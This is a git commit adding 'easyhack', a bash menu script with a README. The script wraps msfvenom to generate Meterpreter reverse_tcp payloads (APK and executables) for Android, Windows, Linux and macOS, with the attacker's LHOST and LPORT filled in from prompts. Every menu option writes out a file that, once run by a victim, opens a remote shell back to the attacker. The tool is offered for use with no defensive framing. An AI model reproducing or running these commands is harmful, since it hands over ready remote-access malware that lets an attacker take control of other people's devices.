35662342105125f0f407a2d97fec3456fdf82e16
root <root@localhost.localdomain>
2017-10-22 19:28:20 +0530

    first commit

---
+++ README.md
@@ -0,0 +1,16 @@
+# easyhack
+
+easyhack is script to create payloads
+
+
+it's create payload For	
+	1.Android
+	2.Windows
+	3.Linux
+	4.MacOS
+
+
+To Run Script:
+	1. Change Dir to Easyhack
+	2. chmod +x easyhack.sh
+	3. ./easyhack.sh
---
+++ easyhack.sh
@@ -0,0 +1,59 @@
+clear
+echo " _______  _______  _______  __   __  __   __  _______  _______  ___   _ "
+echo "|       ||   _   ||       ||  | |  ||  | |  ||   _   ||       ||   | | |"
+echo "|    ___||  |_|  ||  _____||  |_|  ||  |_|  ||  |_|  ||       ||   |_| |"
+echo "|   |___ |       || |_____ |       ||       ||       ||       ||      _|"
+echo "|    ___||       ||_____  ||_     _||       ||       ||      _||     |_ "
+echo "|   |___ |   _   | _____| |  |   |  |   _   ||   _   ||     |_ |    _  |"
+echo "|_______||__| |__||_______|  |___|  |__| |__||__| |__||_______||___| |_|"
+echo "[======================================================================]"
+	   echo -e '\t\t'  "+---------------------------------+"
+	   echo -e '\t\t'  "+          1). Android            +"
+	   echo -e '\t\t'  "+          2). Windows            +"
+	   echo -e '\t\t'  "+          3). Linux              +"
+	   echo -e '\t\t'  "+          4). MacOS              +"
+	   echo -e '\t\t'  "+          5). Exit               +"
+	   echo -e '\t\t'  "+---------------------------------+"
+	   read -p "Choose Platform: " num
+	case $num in
+	1)
+		read -p "Enter LHOST (IP Add.):" ip
+    	read -p "Enter LPORT (Open Port): " port
+    	read -p "Enter APK Name: " apk
+		msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R > ~/Desktop/MyTool/$apk.apk
+		;;
+	2)
+    	read -p "Enter LPORT (Open Port): " port
+    	read -p "Enter LHOST (IP Add.):" ip
+    	read -p "Enter EXE Name: " exe
+		msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R > ~/Desktop/MyTool/$exe.exe
+    	;;
+	3)
+		read -p "Enter LHOST (IP Add.):" ip
+    	read -p "Enter LPORT (Open Port): " port
+    	read -p "Enter File Name: " fname
+		msfvenom -p linux/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R > ~/Desktop/MyTool/$fname.exe
+    	;;
+	4)
+		read -p "Enter LHOST (IP Add.):" ip
+    	read -p "Enter LPORT (Open Port): " port
+    	read -p "Enter File Name: " fname
+		msfvenom -p osx/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R > ~/Desktop/MyTool/$fname.exe
+    	;;
+	5)
+		read -p "Do You Want To Exit?(Y|N) " ans
+		case $ans in
+			y|Y)
+				echo "Good Bye"
+				exit
+				;;
+			n|N)
+				./easyhack.sh
+			;;
+		esac
+		;;
+	*)
+		echo "invalide Choice"
+		;;
+	esac
+
